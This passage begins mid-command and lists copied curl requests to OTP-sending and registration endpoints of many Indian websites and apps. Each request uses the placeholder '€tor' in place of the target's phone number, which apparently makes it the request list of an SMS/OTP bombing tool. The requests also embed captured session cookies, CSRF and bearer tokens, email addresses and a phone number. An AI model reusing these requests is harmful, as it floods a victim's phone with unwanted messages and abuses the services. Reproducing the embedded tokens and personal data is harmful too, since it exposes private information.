  -H 'cookie: _gcl_aw=GCL.1677320048.Cj0KCQiAgOefBhDgARIsAMhqXA6JFUbcz4S-wBBSp2g15GDAyZ8zY60NUSe0GFfb3e_lCUGWaeOda3QaAmTzEALw_wcB; _gcl_au=1.1.1794709593.1677320048; WZRK_G=a47c2ecf27b84275a24cb9fb2916e1f4; WZRK_S_W8R-KZK-Z85Z=%7B%22p%22%3A1%2C%22s%22%3A1677320201%2C%22t%22%3A1677320048%7D; _rdt_uuid=1677320048127.31989fc5-01b6-42a7-b79b-321a5a3f9aa0; _gid=GA1.2.2070372483.1677320048; _fbp=fb.1.1677320048506.619418375; gclid=Cj0KCQiAgOefBhDgARIsAMhqXA6JFUbcz4S-wBBSp2g15GDAyZ8zY60NUSe0GFfb3e_lCUGWaeOda3QaAmTzEALw_wcB; _ga_4J1GL3DRE9=GS1.1.1677320048.1.0.1677320050.0.0.0; 49ddc9a2b229d3f7aa40592f8f8450c3=f2u65r3gf06qvkoen5oo1lpg90; _ga=GA1.2.1656895938.1677320048; _gac_UA-28561360-2=1.1677320119.Cj0KCQiAgOefBhDgARIsAMhqXA6JFUbcz4S-wBBSp2g15GDAyZ8zY60NUSe0GFfb3e_lCUGWaeOda3QaAmTzEALw_wcB; _gat_UA-28561360-2=1' \
  -H 'origin: https://www.khelplayrummy.com' \
  -H 'referer: https://www.khelplayrummy.com/high-roller-eng?data=CnN3mdHmtUdjHepl9DOGwg%3D%3D/&utm_source=Google+Neon&utm_medium=Search&utm_campaign=NG+%7C+Brand+%7C+TIS+%7C+Search&utm_term=p_khelplay&utm_campaign_id=14248936688&utm_adset_id=141122042620&utm_ad_id={creativeid}&gclid=Cj0KCQiAgOefBhDgARIsAMhqXA6JFUbcz4S-wBBSp2g15GDAyZ8zY60NUSe0GFfb3e_lCUGWaeOda3QaAmTzEALw_wcB' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName=€tor&isAjax=true' \
  --compressed

curl 'https://www.safegold.com/register' \
  -H 'authority: www.safegold.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: _gcl_au=1.1.1758035743.1677320209; _ga=GA1.1.1852784815.1677320210; _fbp=fb.1.1677320209786.1890307395; mp_b21743effa937d6c133595a1cd0746bf_mixpanel=%7B%22distinct_id%22%3A%20%22186881348d7504-0495b157d46637-26031951-144000-186881348d8488%22%2C%22%24device_id%22%3A%20%22186881348d7504-0495b157d46637-26031951-144000-186881348d8488%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; laravel_session=eyJpdiI6ImQ4OVpNSm9pM0NNZHMxaTZNbmYzOWc9PSIsInZhbHVlIjoiM1VaMUhwaW83RFp0bnVsc0N2TFYwTkpMWmJORlFoTVV5R1dFVVR5QndIa240WVhoKzNrN01qWm82Q1Yrb3g4TmVrMkJZb1d6RUVsN3BUaStTSllSQlE9PSIsIm1hYyI6IjExOGVkZWJlYTU4NjYxOTNmODA1YTExODk2NGQwMWQzMDliYmUwMzY2NzcyNDlmMTQ3MjNjNGU3MDg3NzdjYzUifQ%3D%3D; moe_uuid=2f4293b1-056f-44d6-9db1-c8a279081e70; _ga_3S31ZK1DZT=GS1.1.1677320209.1.1.1677320236.0.0.0' \
  -H 'origin: https://www.safegold.com' \
  -H 'referer: https://www.safegold.com/about-us' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw '{"whatsappOptStatus":true,"enable_whatsapp":true,"is_check":true,"mobile_no":"€tor","middlename":"","name":""}' \
  --compressed

curl 'https://login.vmartretail.com/user/signup?redirect_url=aHR0cHM6Ly9zZWN1cmUudm1hcnRyZXRhaWwuY29tL215YWNjb3VudA%253D%253D&layout=desktop' \
  -H 'authority: login.vmartretail.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: soa_signuplogin_token=0e850c0aade641d8494b1f5246bcc142170a3f3f; soa_signuplogin_token_expiry=1677324211; soa_signuplogin_token_type=Bearer; utm_source=Direct; _gcl_aw=GCL.1677320325.Cj0KCQiAgOefBhDgARIsAMhqXA5XUgQfgK1fHsiY-ADVhib7RHIY1gh4s-AA6hG9MfFgzut47_WjixgaAuLXEALw_wcB; _gcl_au=1.1.1772480767.1677320325; _ga_M8GRFDRMFL=GS1.1.1677320325.1.0.1677320325.0.0.0; _ga=GA1.2.1689409460.1677320326; _gid=GA1.2.1319829319.1677320326; _gac_UA-142986333-1=1.1677320326.Cj0KCQiAgOefBhDgARIsAMhqXA5XUgQfgK1fHsiY-ADVhib7RHIY1gh4s-AA6hG9MfFgzut47_WjixgaAuLXEALw_wcB; _gat_gtag_UA_142986333_1=1; _fbp=fb.1.1677320325987.1302119401; _hjSessionUser_2534927=eyJpZCI6Ijg3YTA4ZGVkLTNjOWYtNWVlNi04MGQzLTk5MmNhM2JjMzkyYyIsImNyZWF0ZWQiOjE2NzczMjAzMjYwNjcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2534927=0; _hjSession_2534927=eyJpZCI6IjQxMDBiYmI4LWUyZmEtNDM0NC05OWExLWYyNjRmY2VjN2QyMCIsImNyZWF0ZWQiOjE2NzczMjAzMjYwODQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; moe_uuid=2b17902c-88f6-4ed9-ba0f-9cc0bb7347a2; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%222b17902c-88f6-4ed9-ba0f-9cc0bb7347a2%22%2C%22deviceAdded%22%3Atrue%7D; cisession=z6TXCrMUsuU3NN7ZOVr85KHHDVwq9DmeLLhphpJUridqZEqMVgjwe7%2FCLWYdVl1RzfDbDapE5TYRFs%2F0%2FES63IRM%2FI0gEqoV52M6%2Bwj7AHGrdZvksZSXVag815OXubZuQrYV0vD2%2BMrOicTbVpE4NEWVlTcJtfGbTWBeeCfUJuduzOnnQeA2kuPCBvfu0l9TRUTp1XLYX47PpfZrCbGriiIOQ0i%2Bq1TsuF0VJpULSprDxz7RkRlOsj7mpclxedb4ITQD%2BYPeKoJFNNgcTVUkZaViTG85LTQeFFPeRBnGa8dggu42lEqquk%2BpJgXVWy9G8tu8vGEoIAFlO4tUvd8hzaZUDIq74VWDpEaZYCHYY%2BALsjMLVGiTMCnPX57uj%2F0UNDmKuFdGT%2BWlwTA3ZA2c9s1gV88V86moPJNrswBE2sUZWI%2FvklP0O4Bkj0wN%2F1QaLa56KBMUKbvNMcf0qUWsJw%3D%3D; csrf_cookie_name=f951451b577e5fcb2dc687c89716fa83; sess_id=MjQzNTEwYmVkMDExNDU2OWZhYzIxZThmZGFkNzNkOTRkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZQ%3D%3D; at_check=true; mbox=session#d009d4794b8b4ca68d6ade60632e0708#1677322193; _ga=GA1.3.1689409460.1677320326; _gid=GA1.3.1319829319.1677320326; _gat_sc=1; gpv=Login%2FRegistration%7CCheckout; gpv1=Sign%20In; gpv2=Checkout%3ASign%20In; AMCVS_20CC138653C6496B0A490D45%40AdobeOrg=1; AMCV_20CC138653C6496B0A490D45%40AdobeOrg=-637568504%7CMCIDTS%7C19414%7CMCMID%7C15715269866877901878880866360993531782%7CMCAID%7CNONE%7CMCOPTOUT-1677327532s%7CNONE%7CvVersion%7C5.1.1; ln_or=eyIxMDEzMzg3IjoiZCJ9; visit_st=1; s_cc=true; _uetsid=cda94b10b4f511ed87b4a172cc0ff4bf; _uetvid=cda99760b4f511ed9f6b3751c4e50964; s_ptc=0.01%5E%5E0.00%5E%5E0.00%5E%5E0.00%5E%5E0.10%5E%5E0.00%5E%5E3.85%5E%5E0.00%5E%5E4.08; SLDK_OTP=%7B%22user_login%22%3A%229990215285%22%2C%22module%22%3A%22login_via_otp%22%7D; s_nr=1677320361241-New; s_sq=clues-prod%3D%2526c.%2526a.%2526activitymap.%2526page%253DLogin%25252FRegistration%25257CCheckout%2526link%253DSIGN%252520UP%2526region%253Dregister%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DLogin%25252FRegistration%25257CCheckout%2526pidt%253D1%2526oid%253Dfunctiononclick%252528event%252529%25257BsignupLoginDsktpMngr.doRegistration%252528this%252529%25253B%25257D%2526oidt%253D2%2526ot%253DA' \
  -H 'origin: https://login.vmartretail.com' \
  -H 'referer: https://login.vmartretail.com/?redirect_url=aHR0cHM6Ly9zZWN1cmUudm1hcnRyZXRhaWwuY29tL215YWNjb3VudA%3D%3D&layout=desktop' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'email=nbvdbhf%40gmail.com&phone=€tor&register_with_password=&csrf_test_name=f951451b577e5fcb2dc687c89716fa83' \
  --compressed

curl 'https://entri.app/api/v3/users/check-phone/' \
  -H 'authority: entri.app' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'client: web' \
  -H 'content-type: application/json' \
  -H 'cookie: _gcl_au=1.1.1480007263.1677321495; _gid=GA1.2.947182767.1677321496; _gat_gtag_UA_100798254_9=1; _gat_UA-100798254-9=1; _ga=GA1.1.2054055760.1677321496; _fbp=fb.1.1677321495728.695372223; _hjSessionUser_2883549=eyJpZCI6IjM2ZWVlYWMwLWNjZTYtNWMxYy1iMmJkLTI3Mjk2ZTZkOWI5YSIsImNyZWF0ZWQiOjE2NzczMjE0OTU4MjYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2883549=0; _hjSession_2883549=eyJpZCI6ImU3NmNiYWQ2LTc3MWItNGYxYi1hYzk0LTUzOWRjZDQ4MDRiMiIsImNyZWF0ZWQiOjE2NzczMjE0OTU4NTEsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=1; _ga_0ZC25J7WK3=GS1.1.1677321495.1.1.1677321498.0.0.0; mp_5830f8797eddcab822bff041d7ecd1d7_mixpanel=%7B%22distinct_id%22%3A%20%221868826f7006cc-093421f2975ce5-26031951-144000-1868826f7017e7%22%2C%22%24device_id%22%3A%20%221868826f7006cc-093421f2975ce5-26031951-144000-1868826f7017e7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; WZRK_S_R7W-KW8-865Z=%7B%22p%22%3A2%7D; moe_uuid=d9590406-3b5b-4e7f-a59e-5f8fb192c42c' \
  -H 'origin: https://webapp.entri.app' \
  -H 'referer: https://webapp.entri.app/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'user-language: hi' \
  --data-raw '{"phone":"+91€tor"}' \
  --compressed

curl 'https://nxtgenapi.pokerbaazi.com/msc/general/send-app-download-link-on-sms?mobile_no=' \
  -H 'authority: nxtgenapi.pokerbaazi.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.pokerbaazi.com' \
  -H 'referer: https://www.pokerbaazi.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile_no":"€tor"}' \
  --compressed

curl 'https://api-consumer.bharatpe.in/generic/customer/otp/generate' \
  -H 'authority: api-consumer.bharatpe.in' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'clientid: postpe' \
  -H 'content-type: application/json; charset=UTF-8' \
  -H 'origin: https://postpe.app' \
  -H 'referer: https://postpe.app/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36' \
  --data-raw '{"hashKey":"","mobile":"€tor","serviceName":"POSTPE_LEAD_GENERATION","type":"MOBILE"}' \
  --compressed
curl 'https://www.planetfashion.in/capillarylogin/customerRegisterOtpCheck?isAjax=true' \
  -H 'authority: www.planetfashion.in' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: _ga=GA1.2.1826967612.1677320530; _gid=GA1.2.502134713.1677320530; _dc_gtm_UA-78074054-7=1; WZRK_G=1f5ad944a60d4f7bb420ea8f106f2352; WZRK_S_87K-K79-K56Z=%7B%22p%22%3A1%2C%22s%22%3A1677320683%2C%22t%22%3A1677320530%7D; _fbp=fb.1.1677320530448.344530803; a38ead53ad26bd5ebeb4e895c34a1582=g%2Bgy4R0sRl6g1hC6ZB6zGMlz%2BSckGeFlm118pfUYSAfnrxt%2FiVF%2BRCXLMm3fLfZ5bjLIsIoD3tMAfNn0TNt7YAQ9YdM0r%2FsAEYjEp74ldMe0aWBKRrCcfjMkd1fQNsNlDKNV8UxW%2BTrLk3%2BBa4N49LBMqYv%2F891IwWfjWcvNbPUR3g2KdtxhgI%2Bm4lO0GU39bm89TeRFX2xNktZb48hgUtlo6%2BaGet9jRftMB3zgCSp6pnZ6mVWmFdfiOOPojpm%2Fvnqqzx9%2FMGC3ZdsDyzUTQYdymwRVO0tRJ0lamNTKswVptOpxo8y9JS07Tm7sAsvJl9QAJLHi8fZu4nprsrAfxeQ1dZKupax1KyS4uePDSsiQuO4yDZjUIYfCMM5fRSaRmlW8oj4VIpA%2BJMX%2F33DeeOimdeHCdwAl3zqIFYl7uUhNfhadKl37wE6SdGeKJwLR%2FQXmSHZZao3MoclLTkh1YEjfn8fArVp3kixx6SATWUtTrSuvznYCuSoehZV9HGfi3xyv%2FlZWPEdC76MByvMavk6uB8BRScuaji9tMnc2%2Fptz94O41qHQCpz%2Fols4YW75jP32QZRJyutBsrSqCtwovr7rKS18D26wjOtQC6%2BaLRF4PzQr4SkCopqNmFBDQxpsbfatyGE3YdNdwLXEKSpRibI0bUxohCEp2GT%2Be8BpLbtlJquNSJ16AYB%2Fuo0MnFfI7HKhbE2c54i6oW%2F8eiTOncyLalgumu7fPrEnRqUmw7PEIrtykM5ovG6EYKEXEjm0q4LjI5NPi6DnNYgc%2FStxCb5%2FdonKMtCzZLLoMFCN5yqrPRVMpNLCoTTqieg8q8niIMsiDw3eJ41hD9K%2B0L5quI64nDNPGJ9h5PdlU%2BVrvTehYGvAxTB5qEFxh3bHNG%2BdIPLVWjp0NZ%2BJJPcdhIdq5c%2BaZKcrNpzAF%2FU8REgznnqQr46DaoaB%2FoZpYZ9GjgZk7LkI0DSNyIoQZ%2FhIRJ9ckN9lYrffosrGid6FpTCV4p1K%2FCMJPXF8%2Fw16MU7pk%2FDehxMn%2BRB5PRr%2FBfvHErESDNsj9DwaM7PUYn6%2F6WuSUv0z2LHd4pykyXSyA679OU7n0k5ViBhrXcDJBbylMiKWL5VCZHIfTAvIXTl4OIs7wfIdXqroWO%2B21%2BNved0AkqDNck2LkM16qCVWyNS5fzeA%2FWJLzKYrkJUSUnOpYrlh3ijgaTDOLpE%2FQZcxt0C0FGxAh%2B8kQ3%2FdHR4ROplJ5Gg5pA%3D%3Dd010e7600676e39186a209c0e67c10aec0825518' \
  -H 'origin: https://www.planetfashion.in' \
  -H 'referer: https://www.planetfashion.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'mobileoremail=€tor&ajax=1&chkTrack=0&capillaryChk=0&gender-radio=1&firstname=c+vzc&mobile=&email=kg764096%40gmail.com' \
  --compressed



curl 'https://www.gamezy.com/api/auth/getOTP' \
  -H 'authority: www.gamezy.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: gk-session-id=013b13a4-5f9c-481b-97cf-7429ba6bbd85; WZRK_G=ff5481ee82f7405e99183e703d2ab59a; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1677188290%2C%22t%22%3A1677188137%7D; _ga=GA1.2.1544562785.1677188138; _gid=GA1.2.417047249.1677188138; _gat_UA-134154771-1=1; _gat_UA-134602608-1=1; _fbp=fb.1.1677188137873.992070875; afUserId=959d63b7-923a-47e6-acf8-5448babfec5d-p; AF_SYNC=1677188138919; GMZUser1=' \
  -H 'origin: https://www.gamezy.com' \
  -H 'referer: https://www.gamezy.com/game/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  --data-raw '{"verificationChannel":"2","mobile":"€tor"}' \
  --compressed

curl 'https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&isBot=false&source=web' \
  -H 'authority: mightyzeus.housing.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'app-name: desktop_web_buyer' \
  -H 'content-type: application/json; charset=UTF-8' \
  -H 'cookie: userCity=11e12081aa78a3375087; cityUrl=new_delhi; service=buy; category=residential; subCategory=; ssrExperiments=edge_hp_hook_home_alt%3Dv0%3Blow_supply%3Dfalse%3Bedge_hp_hook_pdp%3Dv1%3Brent_relevance_v2%3Dfalse%3Bvisibility_nudge_exp%3Dfalse%3Bcreate_alert_exp%3Dtrue%3Bedge_poc_darkmode_version%3D0%3Bpdp_ui_change%3Dtrue%3Bsimilar_prop_cta%3Dtrue%3Bhigh_price_bucket_experiment%3Dfalse%3Bnpslot_free_pdp%3Dfalse; experiments=hide_free_suggestions_experiment%3Dtrue%3Bedge_bank_offer_screen%3Dv1%3Bshow_crf_visit_together%3Dtrue%3Bsaved_nudge%3Dtrue%3Bpdp_login1_modal%3Dfalse%3Bedge_hp_hook_post_crf%3Dv0; _cq_duid=1.1677188907.Y6kcaUQFJcCRfAky; _cq_suid=1.1677188907.4oRR2laVCC2ql6uS; _ga_Y22XRX1VJR=GS1.1.1677188907.1.0.1677188907.0.0.0; _ga=GA1.2.1077668972.1677188908; _gid=GA1.2.1268897358.1677188908; _gac_UA-64495538-1=1.1677188908.EAIaIQobChMI3qCEj9Cs_QIVgSQrCh3mXgaqEAAYASAAEgLN4PD_BwE; _psid=1; _uuid=8b583974-b249-4aa2-baf1-d870ffbed094; traffic=sourcemedium%3Dgoogle%20%2F%20cpc%3B; is_return_user=false; is_return_session=false; tvc_sm_fc_new=google%7Ccpc; tvc_sm_lc=google%7Ccpc; _gat=1; _uetsid=d000a5d0b3c311ed92e0d74421b9e386; _uetvid=d0010760b3c311ed9296a13f08f12ffd; moe_uuid=690e2b11-5a2a-40ba-9ffb-d82ff5024add; _tac=true~google|not-available; _ta=in~1~519223e576bd22da2a29ab4fdf47ac27; _tas=tmcm34lufzd' \
  -H 'origin: https://housing.com' \
  -H 'phoenix-api-name: LOGIN_SEND_OTP_API' \
  -H 'referer: https://housing.com/?gclid=EAIaIQobChMI3qCEj9Cs_QIVgSQrCh3mXgaqEAAYASAAEgLN4PD_BwE' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"query":"\n  mutation($email: String, $phone: String, $otpLength: Int) {\n    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n      success\n      message\n    }\n  }\n","variables":{"phone":"€tor"}}' \
  --compressed


curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
  --compressed



curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed


curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; 